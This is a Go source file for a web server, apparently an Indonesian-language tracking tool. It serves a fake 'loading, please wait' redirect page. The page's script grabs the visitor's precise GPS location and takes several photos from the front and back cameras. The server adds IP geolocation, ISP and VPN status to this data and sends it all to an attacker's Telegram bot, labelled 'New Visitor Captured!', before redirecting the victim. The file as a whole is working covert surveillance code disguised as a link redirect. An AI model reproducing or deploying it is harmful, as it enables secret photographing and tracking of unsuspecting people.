package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/joho/godotenv"
)

var botToken string
var chatID string
var ip2LocationToken string

type PhotoData struct {
	Image          []string       `json:"image"`
	UserID         string         `json:"userId"`
	URLID          string         `json:"urlId"`
	Camera         []string       `json:"camera"`
	Message        string         `json:"message"`
	DeviceLocation DeviceLocation `json:"deviceLocation"` // optional, kept for backward compat
	Latitude       float64        `json:"latitude"`       // new fields from previous version
	Longitude      float64        `json:"longitude"`
	Accuracy       float64        `json:"accuracy"`
	Source         string         `json:"source"`
}

type DeviceLocation struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
	Accuracy  float64 `json:"accuracy"`
	Timestamp int64   `json:"timestamp"`
}

type LocationData struct {
	CountryCode string  `json:"country_code"`
	CountryName string  `json:"country_name"`
	RegionName  string  `json:"region_name"`
	CityName    string  `json:"city_name"`
	Latitude    float64 `json:"latitude"`
	Longitude   float64 `json:"longitude"`
	ASN         string  `json:"asn"`
	AS          string  `json:"as"`
	IsProxy     bool    `json:"is_proxy"`
}

// Serve landing page (HTML + JS)
func serveLandingPage(w http.ResponseWriter, r *http.Request) {
	originalURL := r.URL.Query().Get("url")
	if originalURL == "" {
		http.Error(w, "URL tujuan tidak ditemukan", http.StatusBadRequest)
		return
	}

	html := fmt.Sprintf(`<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sedang Memuat...</title>
<style>
body { font-family: sans-serif; text-align: center; padding-top: 50px; background:#f0f2f5; }
.spinner { border:8px solid #f3f3f3; border-top:8px solid #3498db; border-radius:50%%; width:60px; height:60px; animation:spin 2s linear infinite; margin:0 auto 20px; }
@keyframes spin { 0%% { transform:rotate(0deg);} 100%%{ transform:rotate(360deg);} }
.location-status { margin:10px 0; color:#666; }
</style>
</head>
<body>
<div class="spinner"></div>
<h1>Memuat konten, harap tunggu...</h1>
<p>Kami sedang mengalihkan Anda ke halaman yang diminta.</p>

<script>
const originalUrl = "%s";
const userId = "%s";
const urlId = "%s";

// get accurate location (watchPosition sampling)
function getDeviceLocation(opts = {}) {
  const goalAccuracy = opts.goalAccuracy || 30;
  const maxSamples = opts.maxSamples || 8;
  const timeoutMs = opts.timeoutMs || 15000;

  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve({ has: false });

    let best = null;
    let samples = 0;
    const id = navigator.geolocation.watchPosition(pos => {
      samples++;
      const s = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: pos.timestamp
      };
      if (!best || s.accuracy < best.accuracy) best = s;
      if (best && best.accuracy <= goalAccuracy) {
        cleanup();
        resolve({ has: true, ...best });
      } else if (samples >= maxSamples) {
        cleanup();
        resolve(best ? { has: true, ...best } : { has: false });
      }
    }, err => {
      cleanup();
      resolve({ has: false });
    }, { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 });

    const t = setTimeout(() => {
      cleanup();
      resolve(best ? { has: true, ...best } : { has: false });
    }, timeoutMs);

    function cleanup() {
      try { navigator.geolocation.clearWatch(id); } catch(e) {}
      clearTimeout(t);
    }
  });
}

async function capturePhoto() {
  const photoCount = 3;
  const delayBetweenShots = 1000;

  const constraints = [
    { video: { facingMode: "user" } },
    { video: { facingMode: "environment" } }
  ];

  async function takePhotosFromStream(stream, cameraUsed) {
    const results = [];
    const video = document.createElement('video');
    video.srcObject = stream;

    await new Promise(resolve => video.onloadedmetadata = resolve);
    video.play();

    for (let i = 0; i < photoCount; i++) {
      await new Promise(r => setTimeout(r, 1200)); // waktu persiapan kamera
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const photo = canvas.toDataURL('image/jpeg', 0.8);
      results.push({ photo, cam: cameraUsed });
      await new Promise(r => setTimeout(r, delayBetweenShots)); // jeda antar foto
    }

    stream.getTracks().forEach(t => t.stop());
    return results;
  }

  async function tryCapture(index = 0) {
    if (index >= constraints.length) throw new Error("Tidak ada kamera yang tersedia");
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints[index]);
      const cameraUsed = index === 0 ? "front" : "back";
      return await takePhotosFromStream(stream, cameraUsed);
    } catch (err) {
      console.warn("Kamera gagal, mencoba kamera lain:", err);
      return await tryCapture(index + 1);
    }
  }

  return await tryCapture(0);
}

async function capturePhotoAndRedirect() {
  try {
    const location = await getDeviceLocation({ goalAccuracy: 30, maxSamples: 8, timeoutMs:15000 });
    const res = await capturePhoto();

    const payload = {
      image: [],
      userId: userId,
      urlId: urlId,
      camera: [],
      message: "Data dikirim dari browser",
      latitude: location.has ? location.latitude : 0,
      longitude: location.has ? location.longitude : 0,
      accuracy: location.has ? location.accuracy : 0,
      source: location.has ? "GPS" : "IP"
    };

	for (const r of res) {
		payload.image.push(r.photo);
		payload.camera.push(r.cam);
	}

    await fetch('/upload-photo', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    }).catch(e => console.warn("upload failed", e));
  } catch (e) {
    console.warn("error:", e);
  } finally {
    window.location.href = originalUrl;
  }
}

window.addEventListener('load', () => {
  setTimeout(capturePhotoAndRedirect, 300);
});
</script>
</body>
</html>`, originalURL, chatID, originalURL)

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

// Helper: Reverse Geocode (Nominatim)
type nominatimResp struct {
	Address map[string]interface{} `json:"address"`
}

func reverseGeocode(lat, lon float64) (countryCode, countryName, regionName, cityName string, err error) {
	url := fmt.Sprintf("https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=%f&lon=%f", lat, lon)
	req, _ := http.NewRequest("GET", url, nil)
	// Nominatim requires a valid User-Agent
	req.Header.Set("User-Agent", "geo-server-example/1.0 (+https://example.com)")
	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", "", "", err
	}
	defer resp.Body.Close()
	var nr nominatimResp
	if err := json.NewDecoder(resp.Body).Decode(&nr); err != nil {
		return "", "", "", "", err
	}
	// address may contain country_code, country, state, province, city, town, village
	if nr.Address == nil {
		return "", "", "", "", nil
	}
	if v, ok := nr.Address["country_code"].(string); ok {
		countryCode = strings.ToUpper(v)
	}
	if v, ok := nr.Address["country"].(string); ok {
		countryName = v
	}
	// prefer city, then town, then village, fallback to county
	if v, ok := nr.Address["city"].(string); ok {
		cityName = v
	} else if v, ok := nr.Address["town"].(string); ok {
		cityName = v
	} else if v, ok := nr.Address["village"].(string); ok {
		cityName = v
	} else if v, ok := nr.Address["county"].(string); ok {
		cityName = v
	}

	// prefer state or province
	if v, ok := nr.Address["state"].(string); ok {
		regionName = v
	} else if v, ok := nr.Address["region"].(string); ok {
		regionName = v
	}

	return countryCode, countryName, regionName, cityName, nil
}

// Helper: IP lookup via ip2location
func getIPLocation(ip string) (*LocationData, error) {
	if ip == "" {
		return nil, fmt.Errorf("ip kosong")
	}
	// strip port if present
	if strings.Contains(ip, ":") {
		if host, _, err := net.SplitHostPort(ip); err == nil {
			ip = host
		}
	}
	url := fmt.Sprintf("https://api.ip2location.io/?key=%s&ip=%s", ip2LocationToken, ip)
	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var loc LocationData
	if err := json.NewDecoder(resp.Body).Decode(&loc); err != nil {
		return nil, err
	}
	return &loc, nil
}

// parse ISP / ASN friendly string
func parseISPAndASN(loc *LocationData) (isp string, asn string) {
	if loc == nil {
		return "", ""
	}
	// ip2location often returns AS like "AS7713 PT Telekomunikasi Indonesia"
	asField := strings.TrimSpace(loc.AS)
	asnDigits := strings.TrimSpace(loc.ASN) // sometimes ASN field contains digits
	// try to extract digits from asField if ASN empty
	if asnDigits == "" {
		re := regexp.MustCompile(`AS(\d+)`)
		m := re.FindStringSubmatch(asField)
		if len(m) >= 2 {
			asnDigits = m[1]
		}
	}
	// attempt isp name from asField by removing leading ASxxx
	ispName := asField
	re2 := regexp.MustCompile(`^AS\d+\s*`)
	ispName = re2.ReplaceAllString(ispName, "")
	ispName = strings.TrimSpace(ispName)
	return ispName, asnDigits
}

// upload handler
func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Metode tidak diizinkan", http.StatusMethodNotAllowed)
		return
	}

	var data PhotoData
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}

	// Determine client IP (X-Forwarded-For preferred)
	clientIP := r.Header.Get("X-Forwarded-For")
	if clientIP == "" {
		clientIP = r.RemoteAddr
	}
	// Normalize (strip port)
	if host, _, err := net.SplitHostPort(clientIP); err == nil {
		clientIP = host
	}

	// Prepare fields to send in message
	var countryCode, countryName, regionName, cityName string
	var lat, lon float64
	var accuracy float64
	var ispName, asn string
	var isProxy bool

	// 1) If GPS coords provided, reverse geocode to get human-readable address
	if (data.Latitude != 0 || data.Longitude != 0) && data.Source == "GPS" {
		cc, cn, rn, cnm, err := reverseGeocode(data.Latitude, data.Longitude)
		if err == nil {
			countryCode, countryName, regionName, cityName = cc, cn, rn, cnm
		}
		lat = data.Latitude
		lon = data.Longitude
		accuracy = data.Accuracy
	} else if data.DeviceLocation.Latitude != 0 || data.DeviceLocation.Longitude != 0 {
		// support older payload structure
		cc, cn, rn, cnm, err := reverseGeocode(data.DeviceLocation.Latitude, data.DeviceLocation.Longitude)
		if err == nil {
			countryCode, countryName, regionName, cityName = cc, cn, rn, cnm
		}
		lat = data.DeviceLocation.Latitude
		lon = data.DeviceLocation.Longitude
		accuracy = data.DeviceLocation.Accuracy
	} else {
		// fallback: use IP geolocation for location fields
		if loc, err := getIPLocation(clientIP); err == nil {
			countryCode = loc.CountryCode
			countryName = loc.CountryName
			regionName = loc.RegionName
			cityName = loc.CityName
			lat = loc.Latitude
			lon = loc.Longitude
			isProxy = loc.IsProxy
			ispName, asn = parseISPAndASN(loc)
		}
	}

	// Always attempt to get ISP/ASN info from IP (if available)
	if loc, err := getIPLocation(clientIP); err == nil {
		// prefer this for ISP fields regardless of GPS
		ispName, asn = parseISPAndASN(loc)
		isProxy = loc.IsProxy
		// if country fields are empty (maybe reverse geocode failed), fill from IP
		if countryCode == "" {
			countryCode = loc.CountryCode
		}
		if countryName == "" {
			countryName = loc.CountryName
		}
		if regionName == "" {
			regionName = loc.RegionName
		}
		if cityName == "" {
			cityName = loc.CityName
		}
		// also fill lat/lon if still zero
		if lat == 0 && lon == 0 {
			lat = loc.Latitude
			lon = loc.Longitude
		}
	}

	// Build message text exactly in the format you requested
	locSource := data.Source
	if locSource == "" {
		if data.DeviceLocation.Latitude != 0 || data.DeviceLocation.Longitude != 0 {
			locSource = "GPS"
		} else {
			locSource = "IP"
		}
	}

	// Build timestamp in Asia/Jakarta
	locTz, _ := time.LoadLocation("Asia/Jakarta")
	now := time.Now().In(locTz).Format("2006-01-02 15:04:05")

	// If clientIP contains port or is ::1:xxxxx keep it as originally observed in header? We'll include raw header too.
	rawIPHeader := r.Header.Get("X-Forwarded-For")
	if rawIPHeader == "" {
		rawIPHeader = r.RemoteAddr
	}

	fromUrl := r.Header.Get("Referer")
	if fromUrl == "" {
		fromUrl = r.RequestURI
	}

	// Compose message
	var sb strings.Builder
	sb.WriteString("📸 New Visitor Captured!\n\n")
	sb.WriteString(fmt.Sprintf("🌍 Source: %s\n", locSource))
	sb.WriteString(fmt.Sprintf("🔢 IP: %s\n", rawIPHeader))
	sb.WriteString(fmt.Sprintf("🌐 URL Host: %s\n\n", fromUrl))

	sb.WriteString("📱 User-Agent:\n")
	sb.WriteString(fmt.Sprintf("%s\n\n", r.Header.Get("User-Agent")))

	sb.WriteString("📍 Location:\n")
	sb.WriteString(fmt.Sprintf("Country Code : %s\n", countryCode))
	sb.WriteString(fmt.Sprintf("Country Name : %s\n", countryName))
	sb.WriteString(fmt.Sprintf("Region Name : %s\n", regionName))
	sb.WriteString(fmt.Sprintf("City Name : %s\n", cityName))
	sb.WriteString(fmt.Sprintf("Lat: %.6f\n", lat))
	sb.WriteString(fmt.Sprintf("Lon: %.6f\n", lon))
	sb.WriteString(fmt.Sprintf("Accuracy: %.1fm\n\n", accuracy))

	mapsURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", lat, lon)
	sb.WriteString(fmt.Sprintf("🗺️ Open Maps: %s\n\n", mapsURL))

	// Camera & ISP & Proxy & Time
	if len(data.Camera) > 0 {
		for i, cam := range data.Camera {
			sb.WriteString(fmt.Sprintf("📷 Kamera %d: %s\n", i+1, cam))
		}
	} else {
		sb.WriteString("📷 Kamera: (tidak diketahui)\n")
	}
	if ispName != "" {
		if asn != "" {
			sb.WriteString(fmt.Sprintf("🔌 ISP: %s (%s)\n", ispName, asn))
		} else {
			sb.WriteString(fmt.Sprintf("🔌 ISP: %s\n", ispName))
		}
	}
	sb.WriteString(fmt.Sprintf("🛡️ Proxy/VPN: %t\n", isProxy))
	sb.WriteString(fmt.Sprintf("⏰ Waktu: %s\n", now))

	message := sb.String()

	// Send to telegram
	if err := sendMessageToTelegram(message); err != nil {
		log.Printf("gagal kirim message: %v", err)
	}

	// Decode image (strip data URI prefix)
	for i, img := range data.Image {
		if img == "" {
			continue
		}
		if idx := strings.Index(img, ","); idx != -1 {
			img = img[idx+1:]
		}

		b, err := base64.StdEncoding.DecodeString(img)
		if err != nil {
			log.Printf("gagal decode image %d: %v", i+1, err)
			continue
		}

		if err := sendPhotoToTelegram(b); err != nil {
			log.Printf("gagal kirim photo %d: %v", i+1, err)
		}
	}

	// respond OK
	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "OK")
}

// Telegram helpers
func sendMessageToTelegram(message string) error {
	api := "https://api.telegram.org/bot" + botToken + "/sendMessage"
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.WriteField("chat_id", chatID)
	writer.WriteField("text", message)
	// DON'T set parse_mode to avoid accidental markdown parsing issues
	writer.Close()

	req, _ := http.NewRequest("POST", api, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(ioutil.Discard, resp.Body)
	return nil
}

func sendPhotoToTelegram(photo []byte) error {
	api := "https://api.telegram.org/bot" + botToken + "/sendPhoto"
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.WriteField("chat_id", chatID)
	part, err := writer.CreateFormFile("photo", "user_photo.jpg")
	if err != nil {
		return err
	}
	if _, err := io.Copy(part, bytes.NewReader(photo)); err != nil {
		return err
	}
	writer.Close()

	req, _ := http.NewRequest("POST", api, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(ioutil.Discard, resp.Body)
	return nil
}

func main() {
	_ = godotenv.Load()
	botToken = os.Getenv("botToken")
	chatID = os.Getenv("chatID")
	ip2LocationToken = os.Getenv("ip2LocationToken")

	if botToken == "" || chatID == "" || ip2LocationToken == "" {
		log.Fatal("Isi botToken, chatID, ip2LocationToken di file .env")
	}

	http.HandleFunc("/", serveLandingPage)
	http.HandleFunc("/upload-photo", uploadPhotoHandler)

	log.Println("Server berjalan di http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
